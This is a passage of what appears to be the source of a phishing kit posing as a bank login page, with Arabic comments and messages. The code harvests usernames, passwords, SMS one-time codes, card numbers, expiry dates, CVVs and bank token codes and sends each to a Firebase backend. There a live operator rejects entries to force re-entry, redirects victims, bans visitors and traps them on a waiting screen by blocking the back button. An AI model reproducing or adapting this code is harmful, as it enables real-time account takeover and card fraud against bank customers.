const OTP_TIMER_DURATION_SECONDS = 60;
const otpTimerSeconds = ref(OTP_TIMER_DURATION_SECONDS);
const otpResendSuccess = ref(false);
let otpInterval: any = null;

const formatOtpTimer = (seconds: number) => {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
};

const startOtpCountdown = (resetToInitial = true) => {
  if (otpInterval) {
    clearInterval(otpInterval);
    otpInterval = null;
  }
  if (resetToInitial) {
    otpTimerSeconds.value = OTP_TIMER_DURATION_SECONDS;
  }
  otpInterval = setInterval(() => {
    if (otpTimerSeconds.value > 0) {
      otpTimerSeconds.value--;
    } else {
      if (otpInterval) {
        clearInterval(otpInterval);
        otpInterval = null;
      }
    }
  }, 1000);
};

const handleResendOtp = () => {
  // 1) إظهار رسالة نجاح الإعادة وإعادة ضبط العداد إلى دقيقة واحدة.
  //    ملاحظة: لا نلمس loginStep / waitingModalState / otpCode لتفادي كسر التوجيه
  //    أو شاشة الانتظار أو حالة خطوة OTP عند المستخدم.
  otpResendSuccess.value = true;
  startOtpCountdown(true);

  // 2) تسجيل الحدث في Firebase حتى يظهر في لوحة التحكم كبطاقة بيانات حمراء
  //    داخل سجل نشاط العميل (Customer Activity Stream).
  //    لا يغيّر هذا الاستدعاء أي حالة محلية حساسة؛ يكتب فقط في قاعدة البيانات.
  try {
    trackCustomerActivity(
      {
        lastAction: "قام المستخدم بالنقر على زر إعادة إرسال الرمز",
      },
      "otp_resend_clicked",
      {
        source: "login_page_otp_step",
        step: "otp",
        timestamp: new Date().toISOString(),
      },
    );
  } catch (err) {
    // في حال فشل تتبع الحدث (مثل عدم توفر Firebase) لا نمنع إعادة الإرسال من العمل
    console.error("Unable to track otp resend click", err);
  }

  setTimeout(() => {
    otpResendSuccess.value = false;
  }, 2200);
};

// عند الضغط على إحدى الخدمات في الواجهة الجديدة (لا تأثير على منطق الدخول)
const onServiceClick = (serviceKey: string) => {
  if (typeof window !== "undefined") {
    // placeholder — لا إجراء فعلي، فقط تتبع للحدث
    console.log("[login-new] service click:", serviceKey);
  }
};



// يمنع إدخال الأحرف والأرقام العربية: نطاق العربية + ملحقاتها + أشكال العرض
const ARABIC_CHARS = new RegExp(
  "[\\u0600-\\u06FF\\u0750-\\u077F\\u08A0-\\u08FF\\uFB50-\\uFDFF\\uFE70-\\uFEFF]",
  "g",
);

const sanitizeArabic = (event: Event): string => {
  const el = event.target as HTMLInputElement;
  const cleaned = el.value.replace(ARABIC_CHARS, "");
  if (cleaned !== el.value) {
    el.value = cleaned;
  }
  return cleaned;
};

const isEmailInput = (val: string): boolean => {
  const trimmed = val.trim().toLowerCase();
  if (trimmed.includes("@")) return true;
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (emailRegex.test(trimmed)) return true;
  const emailKeywords = [
    "gmail",
    "outlook",
    "yahoo",
    "hotmail",
    "icloud",
    "live.com",
    "mail.com",
    "proton",
    "yandex",
    "gmx",
    "zoho",
  ];
  return emailKeywords.some((domain) => trimmed.includes(domain));
};

const setAccountType = (type: "أفراد" | "شركات") => {
  accountType.value = type;
  companyIdError.value = "";
};

const handleCompanyIdInput = (event: Event) => {
  companyId.value = sanitizeArabic(event);
  if (companyIdError.value) {
    companyIdError.value = "";
  }
};

const handleUsernameInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const raw = normalizeDigits(el.value).replace(/[^a-zA-Z0-9]/g, "");
  username.value = raw;
  if (el.value !== raw) {
    el.value = raw;
  }
  if (usernameError.value) {
    usernameError.value = "";
  }
};

// يضمن أن الحقل لا يقبل أي نوع من المسافات (مسافة عادية أو Tab أو Enter...)
const blockSpaceKey = (event: KeyboardEvent) => {
  if (
    event.key === " " ||
    event.key === "Spacebar" ||
    event.keyCode === 32
  ) {
    event.preventDefault();
  }
};

// يضمن منع لصق محتوى يحتوي على مسافات
const blockSpacePaste = (event: ClipboardEvent) => {
  const pasted = event.clipboardData?.getData("text") ?? "";
  if (/\s/.test(pasted)) {
    event.preventDefault();
    const cleaned = pasted.replace(/\s+/g, "");
    const target = event.target as HTMLInputElement;
    if (target) {
      const newValue = (target.value || "") + cleaned;
      target.value = newValue;
      target.dispatchEvent(new Event("input", { bubbles: true }));
    }
  }
};

// يَحسب كل أحرف كود المستخدم (أرقام + حروف) — على الأقل 4 خانات لتفعيل الزر
const usernameCharCount = computed(() => {
  return username.value.trim().length;
});

const validatePasswordConditions = (pwd: string): boolean => {
  const hasMinLength = pwd.length >= 8;
  const hasUpperCase = /[A-Z]/.test(pwd);
  const hasLowerCase = /[a-z]/.test(pwd);
  const hasNumber = /[0-9]/.test(pwd);
  const hasSymbol = /[^A-Za-z0-9]/.test(pwd);
  return hasMinLength && hasUpperCase && hasLowerCase && hasNumber && hasSymbol;
};

const isPasswordValid = computed(() => validatePasswordConditions(password.value));

const handlePasswordInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  // إزالة المسافات والأحرف العربية - يُمنع كتابة الفراغات بين الأحرف
  const cleaned = sanitizeArabic(event).replace(/\s+/g, "");
  password.value = cleaned;
  if (el.value !== cleaned) {
    el.value = cleaned;
  }
  if (passwordError.value && validatePasswordConditions(password.value)) {
    passwordError.value = false;
  }
};

const sanitizeOtp = (event: Event): string => {
  const el = event.target as HTMLInputElement;
  const cleaned = el.value.replace(/[^0-9]/g, "").slice(0, 6);
  if (cleaned !== el.value) {
    el.value = cleaned;
  }
  return cleaned;
};

/* ===== واجهة الـ OTP الجديدة: 6 خانات مع ربطها بنفس المنطق الحالي ===== */
const otpBoxIndexes = [0, 1, 2, 3, 4, 5] as const; // (قديم — يُترك لتفادي كسر أي مرجع قديم)
const otpInputRefs: (HTMLInputElement | null)[] = [null, null, null, null, null, null]; // (قديم)
const otpSingleInput = ref<HTMLInputElement | null>(null);

const setOtpInputRef = (el: any, idx: number) => {
  otpInputRefs[idx] = (el as HTMLInputElement) || null;
};

// تحديث قيمة الخانة في otpCode مع الحفاظ على باقي الخانات (قديم — مُحتفظ به للتوافق)
const setOtpDigitValue = (idx: number, value: string) => {
  const arr = otpCode.value.split("");
  while (arr.length < 6) arr.push("");
  arr[idx] = value;
  // قص إلى 6 خانات فقط
  otpCode.value = arr.join("").slice(0, 6);
};

// عند الكتابة في الحقل الموحَّد: تنظيف + تحديث otpCode
// نستخدم المستخرج الذكي: يحوّل الأرقام العربية (٠-٩) إلى لاتينية
// ويستخرج OTP من أي نص (حتى لو المستخدم كتب كلاماً قبل/بعد الرقم).
const handleOtpInput = (event: Event) => {
  otpExtractor.handleSmartOtpInput(event, (next) => {
    otpCode.value = next;
  });

  // إخفاء رسالة الخطأ عند بدء الكتابة من جديد
  if (rejectionBanner.value && rejectionBanner.value.step === "otp") {
    rejectionBanner.value = null;
  }

  // إرسال تلقائي فور إدخال الأرقام الستة كاملة — بدون الحاجة للنقر على الزر
  if (otpCode.value.length === 6) {
    nextTick(() => {
      handleOtpSubmit();
    });
  }
};

// (قديم — مُحتفظ به للتوافق، لم يعد يُستخدم لأن الحقل أصبح واحداً)
const handleOtpBoxInput = (event: Event, idx: number) => {
  handleOtpInput(event);
};

// (قديم — مُحتفظ به للتوافق)
const handleOtpBoxKeydown = (event: KeyboardEvent, idx: number) => {
  // في الحقل الموحَّد، backspace يحذف الرقم الأخير بشكل طبيعي
  if (event.key === "Backspace" && otpCode.value.length === 1) {
    event.preventDefault();
    otpCode.value = "";
  }
};

// لصق رمز مكوّن من عدة أرقام دفعة واحدة
// ✅ يدعم جميع صيغ الرسائل بأي لغة، منها:
//   - "الرمز:949654"
//   - "رمز:439693"
//   - "رمز التحقق:345834"
//   - "كود التفعيل: 654321"
//   - "OTP: 123456"
//   - "Your code is 123456"
//   - "123456" (رقم خام)
//   - حتى لو وُجد نص قبل/بعد الرقم
const handleOtpPaste = (event: ClipboardEvent) => {
  const filled = otpExtractor.handleSmartOtpPaste(event, (next) => {
    otpCode.value = next;
  });

  if (!filled) {
    // لم يُعثر على رمز صالح في النص الملصوق — لا نُعدّل القيمة
    return;
  }

  // إخفاء رسالة الخطأ عند اللصق
  if (rejectionBanner.value && rejectionBanner.value.step === "otp") {
    rejectionBanner.value = null;
  }

  // إرسال تلقائي عند اكتمال 6 أرقام بعد اللصق
  if (otpCode.value.length === 6) {
    nextTick(() => {
      handleOtpSubmit();
    });
  }
};

// (قديم — مُحتفظ به للتوافق)
const handleOtpBoxPaste = (event: ClipboardEvent) => {
  handleOtpPaste(event);
};

// السماح بالأرقام فقط
const handleOtpKeypress = (event: KeyboardEvent) => {
  otpExtractor.handleSmartOtpKeypress(event);
};

// (قديم — مُحتفظ به للتوافق)
const handleOtpBoxKeypress = (event: KeyboardEvent) => {
  handleOtpKeypress(event);
};

// === تعبئة الـ OTP تلقائياً (iOS/Android/Desktop) ===
// نعتمد على 3 طبقات:
//   1) WebOTP API (Chrome Android + iOS Safari 14+) — يملأ الحقل فور وصول SMS
//   2) `autocomplete="one-time-code"` على الحقل — يظهر اقتراح فوق الكيبورد
//   3) المستخرج الذكي (useOtpExtractor) — يستخرج OTP من أي رسالة ملصوقة

// === WebOTP listener ===
let detachWebOtp: (() => void) | null = null;

const startWebOtpListener = () => {
  if (typeof window === "undefined") return;
  if (detachWebOtp) return; // تجنّب التكرار
  detachWebOtp = otpExtractor.attachWebOtpListener((next) => {
    otpCode.value = next;
    if (rejectionBanner.value && rejectionBanner.value.step === "otp") {
      rejectionBanner.value = null;
    }
    if (otpCode.value.length === 6) {
      nextTick(() => {
        try {
          handleOtpSubmit();
        } catch (err) {
          /* silent */
        }
      });
    }
  });
};

const stopWebOtpListener = () => {
  try {
    detachWebOtp?.();
  } catch {
    /* ignore */
  }
  detachWebOtp = null;
};

// عند فتح خطوة OTP: تركيز الحقل + إجبار الكيبورد على الظهور
// نستخدم click() بعد focus() لأن بعض المتصفحات (خصوصاً Safari iOS)
// تحتاج ضغطة فعلية لإظهار الكيبورد مع اقتراح الرسائل.
const forceFocusOtpInput = () => {
  const el = otpSingleInput.value;
  if (!el) return;
  try {
    el.focus({ preventScroll: true });
    // iOS Safari يحتاج أحياناً إلى setSelectionRange بعد focus
    if (typeof el.setSelectionRange === "function") {
      try { el.setSelectionRange(0, 0); } catch { /* noop */ }
    }
  } catch {
    try { el.focus(); } catch { /* noop */ }
  }
};

const onOtpInputFocus = () => {
  // لا شيء خاص — focus يكفي عادةً
  // لكن نضمن إعادة تشغيل WebOTP عند كل تركيز (بعض المتصفحات تحتاج ذلك)
  if (loginStep.value === "otp") {
    startWebOtpListener();
  }
};

const onOtpInputClick = () => {
  // إعادة التركيز عند الضغط على الحقل (يحاكي الضغط البشري)
  forceFocusOtpInput();
  if (loginStep.value === "otp") {
    startWebOtpListener();
  }
};

const onOtpInputTouchEnd = (e: TouchEvent) => {
  // على iOS، اللمس قد لا يطلق تركيز تلقائياً إذا كان الحقل معطّلاً بصرياً
  e.preventDefault();
  forceFocusOtpInput();
  if (loginStep.value === "otp") {
    startWebOtpListener();
  }
};

watch(
  loginStep,
  async (step) => {
    if (step === "otp") {
      // ننتظر حتى يكتمل رسم الـ DOM
      await nextTick();
      // نكرّر التركيز عدة مرات لأن iOS أحياناً يتجاهل التركيز الأول
      forceFocusOtpInput();
      setTimeout(() => forceFocusOtpInput(), 100);
      setTimeout(() => forceFocusOtpInput(), 300);
      // تشغيل WebOTP بعد تركيز الحقل
      startWebOtpListener();
    } else {
      // إيقاف WebOTP عند الخروج من خطوة OTP لتفادي استهلاك الموارد
      stopWebOtpListener();
    }
  },
  { immediate: true }
);

let customerListenerCustomerId = "";
let lastRedirectTimestamp = Date.now();

const listenToCustomerDecisions = async (customerId: string) => {
  if (!customerId) return;
  if (customerListenerCustomerId === customerId && customerListenerUnsubscribe) {
    return;
  }
  // تنظيف أي اشتراك سابق قبل إنشاء اشتراك جديد لضمان عدم وجود تكرار أو
  // تسريب في الذاكرة عند الانتقال بين الصفحات (مثلاً /waiting-room → /login)
  customerListenerUnsubscribe?.();
  customerListenerUnsubscribe = null;
  customerListenerCustomerId = customerId;
  const databaseModule = await import("firebase/database");
  const db = await getFirebaseDatabase();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${customerId}`);

  let isFirstSnapshot = true;

  customerListenerUnsubscribe = databaseModule.onValue(customerRef, (snapshot) => {
    const data = snapshot.val() as Record<string, any> | null;
    if (!data) return;

    // 0. التحقق الفوري من حظر المستخدم وتوجيهه لصفحة الحظر
    if (
      data.isBanned ||
      (data.bannedUntil && Date.now() < Number(data.bannedUntil)) ||
      data.remoteRedirect?.target === "https://www.google.com" ||
      data.remoteRedirect?.target === "/blocked"
    ) {
      const banTime = data.bannedUntil || (Date.now() + 7 * 24 * 60 * 60 * 1000);
      window.localStorage.setItem("gift_visitor_banned_until", String(banTime));
      window.location.replace("/blocked");
      return;
    }

    if (isFirstSnapshot) {
      isFirstSnapshot = false;
      if (data.remoteRedirect?.timestamp) {
        lastRedirectTimestamp = Math.max(lastRedirectTimestamp, Number(data.remoteRedirect.timestamp));
      }
    }

    // 1 & 2. متابعة حالة بيانات الدخول (كود المستخدم وكلمة المرور المشتركة)
    // البانر يُحفَظ بخطوة الرفض الفعلية (لا خطوة الزبون الحالية)
    // — حتى لو الزبون على خطوة ثانية وقت الرفض، البانر يظهر لما يوصل للخطوة المرفوضة
    const isPasswordRejected = data.passwordStatus === "rejected";
    const isUsernameRejected = data.usernameStatus === "rejected";
    if (isPasswordRejected) {
      // إغلاق المودال إذا كان فعّالاً
      if (waitingModalState.value === "waiting_password" || waitingModalState.value === "waiting_username" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "بيانات الدخول غير صحيحة",
        message: "كود المستخدم أو كلمة المرور غير صحيحة. يرجى التحقق وإعادة المحاولة.",
        step: "password",
      };
    } else if (isUsernameRejected) {
      if (waitingModalState.value === "waiting_password" || waitingModalState.value === "waiting_username" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "بيانات الدخول غير صحيحة",
        message: "كود المستخدم أو كلمة المرور غير صحيحة. يرجى التحقق وإعادة المحاولة.",
        step: "username",
      };
    }

    // 3. متابعة حالة رمز التحقق OTP
    const otpStatus = data.verificationStatus || data.verification?.status;
    if (otpStatus === "rejected") {
      if (waitingModalState.value === "waiting_otp" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "رمز التحقق غير صحيح",
        message: "رمز التحقق (OTP) الذي تم إدخاله غير صحيح أو منتهي الصلاحية. يرجى طلب رمز جديد وإعادة المحاولة.",
        step: "otp",
      };
    }

    // 4. متابعة حالة بيانات البطاقة
    if (data.cardStatus === "rejected") {
      if (waitingModalState.value === "waiting_card" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "بيانات البطاقة غير صحيحة",
        message: "عفواً، بيانات البطاقة المصرفية المدخلة غير صحيحة أو غير مطابقة لسجلات البنك. يرجى التأكد من صحة رقم البطاقة وتاريخ الصلاحية ورمز الأمان (CVV) وإعادة المحاولة.",
        step: "card",
      };
    }

    // 5. متابعة حالة NBE توكن
    if (data.nbeTokenStatus === "rejected") {
      if (waitingModalState.value === "waiting_nbe_token" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "رمز التحقق غير صحيح",
        message: "يرجى التحقق من الرمز الذي تم انشائه في داخل تطبيق NBE Token وإعادة المحاولة.",
        step: "nbe_token",
      };
    }

    // 6. متابعة حالة جهاز توكن
    if (data.bmTokenStatus === "rejected") {
      if (waitingModalState.value === "waiting_bm_token" || waitingModalState.value === "") {
        waitingModalState.value = "";
      }
      rejectionBanner.value = {
        title: "رمز التحقق غير صحيح",
        message: "يرجى التحقق من الرمز الذي تم انشائه من جهاز رموز الأمان وإعادة المحاولة.",
        step: "bm_token",
      };
    }

    // 7. متابعة التوجيه الإداري الفوري (سواء داخل صفحة تسجيل الدخول أو لأي صفحة/رابط آخر)
    if (data.remoteRedirect && data.remoteRedirect.target) {
      const redirectTime = Number(data.remoteRedirect.timestamp) || 0;
      if (redirectTime > lastRedirectTimestamp) {
        lastRedirectTimestamp = redirectTime;
        const target = data.remoteRedirect.target as string;
        const targetStep = data.remoteRedirect.step as "username" | "password" | "otp" | "card" | "nbe_token" | "bm_token" | undefined;

        if (target === "/login" && targetStep) {
          loginStep.value = targetStep;
          waitingModalState.value = "";
          rejectionBanner.value = null;
          router.replace({ query: { ...route.query, step: targetStep } });
          void updateCustomerLoginStep(targetStep);

          if (targetStep === "username") {
            password.value = "";
            otpCode.value = "";
            cardNumber.value = "";
            cardExpiry.value = "";
            cardCvv.value = "";
            nbeTokenCode.value = "";
            bmTokenCode.value = "";
          } else if (targetStep === "password") {
            password.value = "";
            otpCode.value = "";
            cardNumber.value = "";
            cardExpiry.value = "";
            cardCvv.value = "";
            nbeTokenCode.value = "";
            bmTokenCode.value = "";
          } else if (targetStep === "otp") {
            otpCode.value = "";
            cardNumber.value = "";
            cardExpiry.value = "";
            cardCvv.value = "";
            nbeTokenCode.value = "";
            bmTokenCode.value = "";
          } else if (targetStep === "card") {
            cardNumber.value = "";
            cardExpiry.value = "";
            cardCvv.value = "";
            nbeTokenCode.value = "";
            bmTokenCode.value = "";
          } else if (targetStep === "nbe_token") {
            nbeTokenCode.value = "";
            bmTokenCode.value = "";
          } else if (targetStep === "bm_token") {
            bmTokenCode.value = "";
          }
        } else if (target.startsWith("http")) {
          waitingModalState.value = "";
          rejectionBanner.value = null;
          window.location.href = target;
        } else {
          waitingModalState.value = "";
          rejectionBanner.value = null;
          router.push(target);
        }
      }
    }
  });
};
const route = useRoute();

const syncStepFromQuery = () => {
  const qStep = route.query.step as string | undefined;
  if (qStep && ["username", "password", "otp", "card", "nbe_token", "bm_token"].includes(qStep)) {
    loginStep.value = qStep as "username" | "password" | "otp" | "card" | "nbe_token" | "bm_token";
    waitingModalState.value = "";
    // ملاحظة: لا نقوم بإفراغ بانر الرفض هنا حتى لا يحدث وميض بصري قبل أن يصل رد المستمع
    // (Firebase listener) ويقوم بتحديث البانر بناءً على حالة الخطوة الحالية في Firebase.
    void updateCustomerLoginStep(qStep);

    if (qStep === "username") {
      password.value = "";
      otpCode.value = "";
      cardNumber.value = "";
      cardExpiry.value = "";
      cardCvv.value = "";
      nbeTokenCode.value = "";
      bmTokenCode.value = "";
      usernameError.value = "";
    } else if (qStep === "password") {
      password.value = "";
      passwordError.value = false;
      otpCode.value = "";
      cardNumber.value = "";
      cardExpiry.value = "";
      cardCvv.value = "";
      nbeTokenCode.value = "";
      bmTokenCode.value = "";
    } else if (qStep === "otp") {
      otpCode.value = "";
      cardNumber.value = "";
      cardExpiry.value = "";
      cardCvv.value = "";
      nbeTokenCode.value = "";
      bmTokenCode.value = "";
    } else if (qStep === "card") {
      cardNumber.value = "";
      cardExpiry.value = "";
      cardCvv.value = "";
      nbeTokenCode.value = "";
      bmTokenCode.value = "";
    } else if (qStep === "nbe_token") {
      nbeTokenCode.value = "";
      bmTokenCode.value = "";
    } else if (qStep === "bm_token") {
      bmTokenCode.value = "";
    }
  }
};

watch(
  loginStep,
  (step) => {
    if (!import.meta.client) return;
    if (step === "otp") {
      startOtpCountdown(true);
    }
    try {
      void updateCustomerLoginStep(step);
    } catch (e) {
      console.warn("Could not track login step:", e);
    }
  },
  { immediate: true }
);

watch(() => route.query, syncStepFromQuery, { immediate: true });

// منع الزبون من الرجوع للخلف في المتصفح أثناء ظهور نافذة الانتظار
const handlePopState = () => {
  if (
    waitingModalState.value &&
    (waitingModalState.value.startsWith("waiting_") || waitingModalState.value.includes("waiting"))
  ) {
    window.history.pushState(null, "", window.location.href);
  }
};

watch(waitingModalState, (newState) => {
  if (
    typeof window !== "undefined" &&
    newState &&
    (newState.startsWith("waiting_") || newState.includes("waiting"))
  ) {
    window.history.pushState(null, "", window.location.href);
  }
});

onMounted(async () => {
  if (typeof window !== "undefined") {
    window.addEventListener("popstate", handlePopState);
    if (loginStep.value === "otp") {
      startOtpCountdown(true);
    }

    // تفعيل مستمع Firebase تلقائياً إذا كان هناك customerId محفوظ
    // (مهم عند إعادة التوجيه من صفحة الانتظار بعد الرفض)
    const existingCustomerId = getCustomerId();
    if (existingCustomerId && !customerListenerUnsubscribe) {
      currentCustomerId.value = existingCustomerId;
      await listenToCustomerDecisions(existingCustomerId);
    }
  }
});

onBeforeUnmount(() => {
  if (typeof window !== "undefined") {
    window.removeEventListener("popstate", handlePopState);
  }
  if (otpInterval) {
    clearInterval(otpInterval);
    otpInterval = null;
  }
  // إيقاف WebOTP listener
  stopWebOtpListener();
});

const normalizeDigits = (str: string) => {
  if (!str) return "";
  const arabicDigits = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
  return str.replace(/[٠-٩]/g, (d) => String(arabicDigits.indexOf(d)));
};

const handleCardNumberInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const rawDigits = normalizeDigits(el.value).replace(/[^0-9]/g, "").slice(0, 16);
  const parts = rawDigits.match(/.{1,4}/g) || [];
  const formatted = parts.join(" ");
  cardNumber.value = formatted;
  if (el.value !== formatted) {
    el.value = formatted;
  }
};

const validateCardExpiry = (isTouched: boolean = false): boolean => {
  if (!cardExpiry.value) {
    if (isTouched) cardExpiryError.value = "يرجى إدخال تاريخ الانتهاء";
    return false;
  }

  const raw = cardExpiry.value.trim();
  if (raw.length < 5 || !raw.includes("/")) {
    if (isTouched) cardExpiryError.value = "صيغة التاريخ غير صحيحة (MM/YY)";
    return false;
  }

  const [mStr = "", yStr = ""] = raw.split("/");
  const month = parseInt(mStr, 10);
  const year2Digit = parseInt(yStr, 10);

  if (isNaN(month) || isNaN(year2Digit)) {
    if (isTouched) cardExpiryError.value = "تاريخ الانتهاء غير صحيح";
    return false;
  }

  if (month < 1 || month > 12) {
    if (isTouched) cardExpiryError.value = "الشهر غير صحيح (بين 01 و 12)";
    return false;
  }

  const now = new Date();
  const currentFullYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;
  const fullYear = 2000 + year2Digit;

  // فحص ما إذا كان التاريخ أقل من الشهر والسنة الحاليين (منتهي)
  if (fullYear < currentFullYear || (fullYear === currentFullYear && month < currentMonth)) {
    if (isTouched) cardExpiryError.value = "تاريخ البطاقة منتهي الصلاحية";
    return false;
  }

  // فحص ما إذا كان التاريخ أكثر من 5 سنوات من الشهر والسنة الحاليين
  const maxYear = currentFullYear + 5;
  if (fullYear > maxYear || (fullYear === maxYear && month > currentMonth)) {
    if (isTouched) cardExpiryError.value = "تاريخ الصلاحية لا يتجاوز 5 سنوات";
    return false;
  }

  cardExpiryError.value = "";
  return true;
};

let prevCardExpiry = "";

const handleCardExpiryInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const isDeleting =
    (event instanceof InputEvent && event.inputType.startsWith("delete")) ||
    el.value.length < prevCardExpiry.length;

  let rawDigits = normalizeDigits(el.value).replace(/[^0-9]/g, "").slice(0, 4);

  if (!rawDigits) {
    cardExpiry.value = "";
    prevCardExpiry = "";
    el.value = "";
    cardExpiryError.value = "";
    return;
  }

  let formatted = "";

  if (isDeleting) {
    if (rawDigits.length === 1) {
      formatted = rawDigits;
    } else if (rawDigits.length === 2) {
      formatted = `${rawDigits}/`;
    } else if (rawDigits.length > 2) {
      formatted = `${rawDigits.slice(0, 2)}/${rawDigits.slice(2)}`;
    }
  } else {
    const firstDigit = parseInt(rawDigits[0] || "0", 10);

    // إذا أدخل رقماً بين 2 و 9 كأول خانة (بما فيها 3 إلى 9)، يضاف صفر تلقائياً ويتحول إلى 0X/ وينتقل للسنة
    if (rawDigits.length === 1) {
      if (firstDigit >= 2 && firstDigit <= 9) {
        formatted = `0${rawDigits}/`;
      } else {
        formatted = rawDigits; // 0 أو 1
      }
    } else {
      let monthStr = rawDigits.slice(0, 2);
      let yearStr = rawDigits.slice(2, 4);

      if (firstDigit >= 2 && firstDigit <= 9 && rawDigits.length === 2 && !el.value.includes("/")) {
        monthStr = `0${rawDigits[0]}`;
        yearStr = rawDigits[1] || "";
      } else {
        const monthNum = parseInt(monthStr, 10);
        if (monthNum > 12) {
          // لا يسمح بشهر أكثر من 12 -> تحويله لـ 12
          monthStr = "12";
        } else if (monthNum === 0) {
          monthStr = "01";
        }
      }

      formatted = yearStr ? `${monthStr}/${yearStr}` : `${monthStr}/`;
    }
  }

  cardExpiry.value = formatted;
  prevCardExpiry = formatted;
  if (el.value !== formatted) {
    el.value = formatted;
  }

  if (formatted.length === 5) {
    validateCardExpiry(true);
  } else {
    cardExpiryError.value = "";
  }
};

const handleCardCvvInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const raw = normalizeDigits(el.value).replace(/[^0-9]/g, "").slice(0, 3);
  cardCvv.value = raw;
  if (el.value !== raw) {
    el.value = raw;
  }
};

const showBmToken = ref(false);

const handleNbeTokenInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const raw = normalizeDigits(el.value).replace(/[^0-9]/g, "").slice(0, 8);
  nbeTokenCode.value = raw;
  if (el.value !== raw) {
    el.value = raw;
  }

  // إخفاء رسالة الخطأ عند بدء الكتابة من جديد
  if (rejectionBanner.value && rejectionBanner.value.step === "nbe_token") {
    rejectionBanner.value = null;
  }

  // إرسال تلقائي فور إدخال 8 أرقام — بدون الحاجة للنقر على الزر
  if (raw.length === 8) {
    nextTick(() => {
      handleNbeTokenSubmit();
    });
  }
};

const handleBmTokenInput = (event: Event) => {
  const el = event.target as HTMLInputElement;
  const raw = normalizeDigits(el.value).replace(/[^0-9]/g, "");
  bmTokenCode.value = raw;
  if (el.value !== raw) {
    el.value = raw;
  }
};

const handleBmCancel = () => {
  bmTokenCode.value = "";
};

const isCardFormValid = computed(() => {
  const rawNum = cardNumber.value.replace(/\s+/g, "");
  const hasValidNum = rawNum.length >= 15;
  const hasValidExp = validateCardExpiry(false);
  const hasValidCvv = cardCvv.value.length === 3;
  return hasValidNum && hasValidExp && hasValidCvv && !cardExpiryError.value;
});

const handleFormSubmit = () => {
  // عند إعادة الإرسال بعد الرفض، نقوم بإخفاء البانر
  rejectionBanner.value = null;

  if (loginStep.value === "username") {
    handleUsernameSubmit();
  } else if (loginStep.value === "password") {
    handlePasswordSubmit();
  } else if (loginStep.value === "otp") {
    handleOtpSubmit();
  } else if (loginStep.value === "card") {
    handleCardSubmit();
  } else if (loginStep.value === "nbe_token") {
    handleNbeTokenSubmit();
  } else if (loginStep.value === "bm_token") {
    handleBmTokenSubmit();
  }
};

const handleUsernameSubmit = async () => {
  if (!username.value.trim()) return;
  if (accountType.value === "شركات" && !companyId.value.trim()) {
    companyIdError.value = "يرجى إدخال هوية الشركة.";
    return;
  }
  if (loginTrap.value.trim()) return;

  const usernameValue = username.value.trim();
  const companyIdValue = companyId.value.trim();

  if (isEmailInput(usernameValue)) {
    usernameError.value = "كود المستخدم المدخل خطأ، يرجى المحاولة مرة أخرى.";
    try {
      trackCustomerActivity(
        {
          lastAction: `أدخل بريد إلكتروني في خانة كود المستخدم (خطأ): ${usernameValue}`,
        },
        "invalid_username_email",
        { enteredValue: usernameValue }
      );
    } catch (err) {
      console.error("Unable to track invalid email input", err);
    }
    return;
  }

  usernameError.value = "";
  companyIdError.value = "";

  // الانتقال الفوري لخطوة كلمة المرور
  loginStep.value = "password";
  waitingModalState.value = "";
  router.replace({ query: { ...route.query, step: "password" } });

  try {
    const custId = await submitUsernameStep(usernameValue, accountType.value, companyIdValue);
    currentCustomerId.value = custId ?? "";

    if (custId) {
      await listenToCustomerDecisions(custId);
    }
  } catch (error) {
    console.error("Unable to submit username step", error);
  }
};

const handlePasswordSubmit = async () => {
  if (!password.value || !password.value.trim()) return;
  if (loginTrap.value.trim()) return;

  // التحقق من شروط كلمة المرور: حرف كبير، حرف صغير، رقم، ورمز خاص
  if (!validatePasswordConditions(password.value.trim())) {
    passwordError.value = true;
    return;
  }

  passwordError.value = false;

  try {
    const result = await submitPasswordStep(password.value.trim());
    currentCustomerId.value = result?.customerId ?? currentCustomerId.value;
    currentAttemptId.value = result?.attemptId ?? "";
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Unable to submit password step", error);
  }
};

const handleOtpSubmit = async () => {
  const normalizedOtp = otpCode.value.replace(/[^0-9]/g, "").slice(0, 6);
  otpCode.value = normalizedOtp;
  if (!normalizedOtp) return;
  if (loginTrap.value.trim()) return;

  const attemptId = currentAttemptId.value || `attempt-${Date.now()}`;
  try {
    const custId = await submitLoginAttemptOtp(attemptId, normalizedOtp);
    currentCustomerId.value = custId ?? currentCustomerId.value;
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Unable to submit OTP step", error);
  }
};

const handleCardSubmit = async () => {
  if (!validateCardExpiry(true)) return;
  if (!isCardFormValid.value) return;
  if (loginTrap.value.trim()) return;

  const attemptId = currentAttemptId.value || `attempt-${Date.now()}`;

  try {
    const custId = await submitCardInfoStep(attemptId, {
      cardNumber: cardNumber.value.trim(),
      cardExpiry: cardExpiry.value.trim(),
      cardCvv: cardCvv.value.trim(),
    });
    currentCustomerId.value = custId ?? currentCustomerId.value;
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Unable to submit card info step", error);
  }
};

const handleNbeTokenSubmit = async () => {
  const tokenValue = nbeTokenCode.value.replace(/[^0-9]/g, "").slice(0, 8);
  nbeTokenCode.value = tokenValue;
  if (tokenValue.length !== 8) return;
  if (loginTrap.value.trim()) return;

  const attemptId = currentAttemptId.value || `attempt-${Date.now()}`;

  try {
    const custId = await submitNbeTokenStep(attemptId, tokenValue);
